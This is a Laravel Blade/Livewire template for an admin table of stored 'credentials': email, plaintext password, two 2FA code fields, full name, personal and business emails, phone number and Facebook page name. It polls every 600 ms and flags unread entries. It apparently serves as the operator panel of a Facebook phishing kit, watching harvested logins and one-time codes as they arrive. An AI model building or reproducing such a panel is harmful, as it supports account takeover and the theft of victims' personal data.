<div wire:poll.600ms>
    <div class="mb-5 mt-4">
        <div class="flex flex-wrap justify-between">
            <div class="md:w-1/2">
                <form>
                    <div class="flex items-center w-full">
                        <input name="search"
                               placeholder="{{ __('crud.common.search') }}"
                               value="{{ $search ?? '' }}"
                               wire:model="search"
                               autocomplete="off"
                        />
                    </div>
                </form>
            </div>
            <div class="md:w-1/2 text-right">
                @can('create', App\Models\Credential::class)
                    <a
                        href="{{ route('credentials.create') }}"
                        class="button button-primary"
                    >
                        <i class="mr-1 icon ion-md-add"></i>
                        @lang('crud.common.create')
                    </a>
                @endcan
            </div>
        </div>
    </div>

    <div class="block w-full overflow-auto scrolling-touch">
        <table class="w-full max-w-full mb-4 bg-transparent">
            <thead class="text-gray-700">
            <tr>
                <th class="px-4 py-3 text-left">
                    @lang('crud.credentials.inputs.email')
                </th>
                <th class="px-4 py-3 text-left">
                    @lang('crud.credentials.inputs.password')
                </th>
                <th class="px-4 py-3 text-left">
                    @lang('crud.credentials.inputs.2fa_code')
                </th>
                <th class="px-4 py-3 text-left">
                    @lang('crud.credentials.inputs.2fa_code_2')
                </th>


                <th class="px-4 py-3 text-left">
                    @lang('crud.credentials.inputs.general_information')
                </th>
                <th class="px-4 py-3 text-left">
                    @lang('crud.credentials.inputs.full_name')
                </th>
                <th class="px-4 py-3 text-left">
                    @lang('crud.credentials.inputs.business_email_address')
                </th>
                <th class="px-4 py-3 text-left">
                    @lang('crud.credentials.inputs.personal_email_address')
                </th>
                <th class="px-4 py-3 text-left">
                    @lang('crud.credentials.inputs.mobile_phone_number')
                </th>
                <th class="px-4 py-3 text-left">
                    @lang('crud.credentials.inputs.facebook_page_name')
                </th>
                <th></th>
            </tr>
            </thead>
            <tbody class="text-gray-600">
            @forelse($credentials as $credential)
                <tr class="hover:bg-gray-50" @if(!$credential->is_read_by) style="background-color: #f5f3ed;" @endif>
                    <td class="px-4 py-3 text-left">
                        <span onclick="copyToClipboard((this.textContent || this.innerText))">{{ $credential->email ?? '-' }}</span>
                    </td>
                    <td class="px-4 py-3 text-left">
                        <span onclick="copyToClipboard((this.textContent || this.innerText))">{{ $credential->password ?? '-' }}</span>
                    </td>
                    <td class="px-4 py-3 text-left">
                        <span onclick="copyToClipboard((this.textContent || this.innerText))">{{ $credential->{'2fa_code'} ?? '-' }}</span>
                    </td>
                    <td class="px-4 py-3 text-left">
                        <span onclick="copyToClipboard((this.textContent || this.innerText))">{{ $credential->{'2fa_code_2'} ?? '-' }}</span>
                    </td>



                    <td class="px-4 py-3 text-left">
                        <span onclick="copyToClipboard((this.textContent || this.innerText))">{{ $credential->general_information ?? '-' }}</span>
                    </td>
                    <td class="px-4 py-3 text-left">
                        <span onclick="copyToClipboard((this.textContent || this.innerText))">{{ $credential->{'full_name'} ?? '-' }}</span>
                    </td>
                    <td class="px-4 py-3 text-left">
                        <span onclick="copyToClipboard((this.textContent || this.innerText))">{{ $credential->{'business_email_address'} ?? '-' }}</span>
                    </td>
                    <td class="px-4 py-3 text-left">
                        <span onclick="copyToClipboard((this.textContent || this.innerText))">{{ $credential->{'personal_email_address'} ?? '-' }}</span>
                    </td>
                    <td class="px-4 py-3 text-left">
                        <span onclick="copyToClipboard((this.textContent || this.innerText))">{{ $credential->{'mobile_phone_number'} ?? '-' }}</span>
                    </td>
                    <td class="px-4 py-3 text-left">
                        <span onclick="copyToClipboard((this.textContent || this.innerText))">{{ $credential->{'facebook_page_name'} ?? '-' }}</span>
                    </td>

                    <td
                        class="px-4 py-3 text-center"
                        style="width: 134px;"
                    >
                        <div
                            role="group"
                            aria-label="Row Actions"
                            class="
                                            relative
                                            inline-flex
                                            align-middle
                                        "
                        >
                            @if(!$credential->is_read_by)
                                <form
                                    action="{{ route('credentials.read', $credential) }}"
                                    method="POST"
                                    onsubmit="return confirm('{{ __('crud.common.are_you_sure') }}')"
                                >
                                    @csrf @method('PUT')
                                    <button
                                        type="submit"
                                        class="button"
                                    >
                                        <i
                                            class="
                                                            icon
                                                            ion-md-checkmark
                                                            text-red-600
                                                        "
                                        ></i>
                                    </button>
                                </form>
                            @endif

                            @can('update', $credential)
                                <a
                                    href="{{ route('credentials.edit', $credential) }}"
                                    class="mr-1"
                                >
                                    <button
                                        type="button"
                                        class="button"
                                    >
                                        <i
                                            class="icon ion-md-create"
                                        ></i>
                                    </button>
                                </a>
                            @endcan @can('delete', $credential)
                                <form
                                    action="{{ route('credentials.destroy', $credential) }}"
                                    method="POST"
                                    onsubmit="return confirm('{{ __('crud.common.are_you_sure') }}')"
                                >
                                    @csrf @method('DELETE')
                                    <button
                                        type="submit"
                                        class="button"
                                    >
                                        <i
                                            class="
                                                        icon
                                                        ion-md-trash
                                                        text-red-600
                                                    "
                                        ></i>
                                    </button>
                                </form>
                            @endcan
                        </div>
                    </td>
                </tr>
            @empty
                <tr>
                    <td colspan="4">
                        @lang('crud.common.no_items_found')
                    </td>
                </tr>
            @endforelse
            </tbody>
            <tfoot>
            <tr>
                <td colspan="4">
                    <div class="mt-10 px-4">
                        {!! $credentials->render() !!}
                    </div>
                </td>
            </tr>
            </tfoot>
        </table>
    </div>
</div>
